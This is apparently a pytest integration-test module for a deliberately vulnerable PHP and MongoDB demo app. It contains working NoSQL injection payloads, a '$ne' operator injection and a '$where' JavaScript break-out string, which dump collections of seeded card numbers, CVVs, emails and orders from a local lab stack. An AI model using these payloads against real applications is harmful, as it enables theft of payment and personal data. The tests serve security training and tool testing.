"""Functional tests for the vulnerable NoSQL-injection demo app in ``vuln_apps``.

These tests exercise an *already-running* Docker Compose stack that serves the
vulnerable PHP app at ``http://localhost:8080`` (see
``vuln_apps/docker-compose.yml``). They are integration tests: if the stack is not
reachable, the whole module is skipped.

The app exposes three endpoints, each with a NoSQL injection flaw:

* ``/acct.php?acctid=...``
    Operator injection -- ``?acctid[$ne]=`` turns the lookup filter into
    ``{"id": {"$ne": ""}}`` and dumps every payment record (card numbers + CVV).
* ``/userdata.php?usersearch=...``
    ``$where`` JavaScript injection -- a crafted payload forces the ``$where``
    function to return ``true`` for every document.
* ``/orderdata.php?ordersearch=...``
    ``$where`` JavaScript injection (same technique, different collection).

Each endpoint is tested twice: a *baseline* (a normal single-record lookup) and an
*injection* (a crafted payload that dumps the whole collection). The injection
tests assert that the full collection is returned, demonstrating the vulnerability.

Start the stack first, then run:

    cd vuln_apps && docker compose up -d
    pytest tests/test_vuln_app.py -v
"""

import os
import re

import pytest
import requests

# Base URL of the running compose stack. Override with NOSQLMAP_APP_URL if the
# stack is served somewhere else.
BASE_URL = os.environ.get("NOSQLMAP_APP_URL", "http://localhost:8080").rstrip("/")
TIMEOUT = 10

# --- Expected seed data (from vuln_apps/docker/mongo/mongo.nosql) -------------
# paymentinfo: (name, id, card_number, cvv2)
PAYMENTS = [
    ("Adrien", "42", "5555123456789999", "1234"),
    ("Justin", "99", "5555123456780000", "4321"),
    ("Robin", "1", "3333444455556666", "2222"),
    ("Moses", "2", "4444555566667777", "3333"),
    ("Rick", "3", "5555666677778888", "5678"),
    ("Nobody", "0", "45009876543215555", "9999"),
]
# users: (name, username, email)
USERS = [
    ("Adrien", "adrien", "adrien@sec642.org"),
    ("Justin", "justin", "justin@sec642.org"),
    ("Robin", "digininja", "digininja@sec642.org"),
    ("Moses", "adrien", "moses@sec642.org"),
    ("Rick", "rick", "rick@sec642.org"),
    ("Nobody", "administrator", "root@sec642.org"),
]
# orders: (id, name, item, quantity)
ORDERS = [
    ("42", "Adrien", "Fuzzy pink towel", "1"),
    ("99", "Justin", "Bird supplies", "4"),
    ("1", "Robin", "Music gift cards", "100"),
    ("1001", "Moses", "Miami Heat tickets", "1000"),
    ("66", "Rick", "Black hoodie", "1"),
    ("0", "Nobody", "Nothing", "0"),
]

# Injection payload for the $where JavaScript endpoints. It breaks out of the
# string literal and forces the $where function to return true for every document.
# It deliberately does NOT use a // comment: the template's closing brace is the
# last character, so a line comment would swallow it and break the function body.
WHERE_INJECTION = "' ; return true; '"


def _strip_html(html):
    """Remove HTML tags and collapse whitespace for simple text assertions."""
    text = re.sub(r"<[^>]+>", " ", html)
    return re.sub(r"\s+", " ", text).strip()


def _get(path, params):
    """GET ``path`` with ``params`` and return the response body as plain text."""
    resp = requests.get(BASE_URL + path, params=params, timeout=TIMEOUT)
    resp.raise_for_status()
    return _strip_html(resp.text)


def _count(text, marker):
    """Count how many times ``marker`` appears in ``text`` (one per record)."""
    return text.count(marker)


@pytest.fixture(scope="module")
def app():
    """Skip the whole module if the compose stack is not reachable."""
    try:
        requests.get(BASE_URL + "/index.html", timeout=TIMEOUT)
    except requests.exceptions.RequestException as exc:
        pytest.skip(
            "vulnerable app not reachable at %s (%s). Start the stack first: "
            "cd vuln_apps && docker compose up -d" % (BASE_URL, type(exc).__name__)
        )
    return BASE_URL


# --- Index page ----------------------------------------------------------------
def test_index_page_loads(app):
    """The landing page is served and links to the vulnerable form."""
    html = requests.get(app + "/index.html", timeout=TIMEOUT).text
    assert "Customer Information" in html
    assert "acct.php" in html


# --- acct.php: operator injection ----------------------------------------------
def test_acct_baseline_single_record(app):
    """A normal lookup by customer ID returns exactly that customer's card."""
    text = _get("/acct.php", {"acctid": "42"})
    # Adrien's card is returned...
    assert "5555123456789999" in text
    # ...and only one record is found.
    assert _count(text, "Card Number:") == 1


def test_acct_injection_dumps_all_cards(app):
    """``?acctid[$ne]=`` injects a $ne operator and dumps every payment record."""
    text = _get("/acct.php", {"acctid[$ne]": ""})
    # The injection returns the whole collection (more than the baseline's 1).
    assert _count(text, "Card Number:") == len(PAYMENTS)
    # Every seeded card number is exposed.
    for _name, _id, card, _cvv in PAYMENTS:
        assert card in text


# --- userdata.php: $where JavaScript injection ---------------------------------
def test_user_baseline_returns_matches(app):
    """A normal username search returns only the matching user(s)."""
    text = _get("/userdata.php", {"usersearch": "adrien"})
    # Two seeded users share the username "adrien".
    assert _count(text, "Username:") == 2
    assert "adrien@sec642.org" in text


def test_user_injection_dumps_all_users(app):
    """A $where payload that returns true dumps the entire users collection."""
    text = _get("/userdata.php", {"usersearch": WHERE_INJECTION})
    # The injection returns every user (more than the baseline's 2).
    assert _count(text, "Username:") == len(USERS)
    # Every seeded email is exposed.
    for _name, _username, email in USERS:
        assert email in text


# --- orderdata.php: $where JavaScript injection --------------------------------
def test_order_baseline_single_record(app):
    """A normal order lookup by ID returns exactly that order."""
    text = _get("/orderdata.php", {"ordersearch": "42"})
    assert "Fuzzy pink towel" in text
    assert _count(text, "Order ID:") == 1


def test_order_injection_dumps_all_orders(app):
    """A $where payload that returns true dumps the entire orders collection."""
    text = _get("/orderdata.php", {"ordersearch": WHERE_INJECTION})
    # The injection returns every order (more than the baseline's 1).
    assert _count(text, "Order ID:") == len(ORDERS)
    # Every seeded order item is exposed.
    for _id, _name, item, _qty in ORDERS:
        assert item in text
